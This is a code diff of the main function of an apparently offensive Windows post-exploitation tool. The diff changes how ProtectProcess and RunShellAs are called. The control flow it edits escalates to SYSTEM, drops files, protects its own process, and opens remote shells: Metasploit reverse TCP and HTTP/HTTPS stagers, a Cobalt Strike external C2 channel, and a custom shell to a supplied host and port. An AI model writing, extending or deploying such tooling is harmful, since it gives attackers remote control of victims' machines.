@@ -87,7 +87,7 @@ int wmain(int argc, WCHAR* argv[]){
                 GetSystem(APICall.Kernel32Api, APICall.Advapi32Api);
             } else if(IsRunAsSystem(APICall.Kernel32Api)){
                 if (GetInfoPipeSystem(&listAgrument)){
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     initWSAS();
                     RunShell(APICall.Kernel32Api, APICall.Advapi32Api,listAgrument);
                 } else{
@@ -119,7 +119,7 @@ int wmain(int argc, WCHAR* argv[]){
             DropFiles(APICall.Kernel32Api, APICall.CabinetApi, listAgrument.wincatDefaultDir, listAgrument.toDROP);
         if (argc >= 3) {
             if (listAgrument.GetSystem) {
-                ProtectProcess();
+                ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                 PrivEsc(APICall.Kernel32Api, APICall.Advapi32Api, APICall.Shell32Api, APICall.CabinetApi, listAgrument);
                 return FALSE;
             } else if (initWSAS()) {
@@ -127,29 +127,29 @@ int wmain(int argc, WCHAR* argv[]){
                 case PAYLOAD_RECV_CMD:
                 case PAYLOAD_RECV_PS:
                     if (listAgrument.lpszUsername[0] == 0) {
-                        ProtectProcess();
+                        ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                         RunShell(APICall.Kernel32Api, APICall.Advapi32Api, listAgrument);
                     }else
-                        RunShellAs(listAgrument);
+                        RunShellAs(APICall.Kernel32Api, APICall.Advapi32Api, APICall.UserenvApi, listAgrument);
                     break;
                 case PAYLOAD_MSF_RECV_TCP:
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     MsfReverseTcp(listAgrument);
                     break;
                 case PAYLOAD_MSF_RECV_HTTP:
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     StagerReverseHTTP(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                     break;
                 case PAYLOAD_MSF_RECV_HTTPS:
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     StagerReverseHTTPS(APICall.Kernel32Api, APICall.WininetApi, listAgrument.host, listAgrument.port);
                     break;
                 case PAYLOAD_CS_EXTERNAL_C2:
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     csExternalC2(listAgrument.host, listAgrument.port);
                     break;
                 case PAYLOAD_CUSTOM_SHELL:
-                    ProtectProcess();
+                    ProtectProcess(APICall.Kernel32Api, APICall.ntdllApi);
                     CustomShell(listAgrument.host, listAgrument.port);
                     break;
                 default:
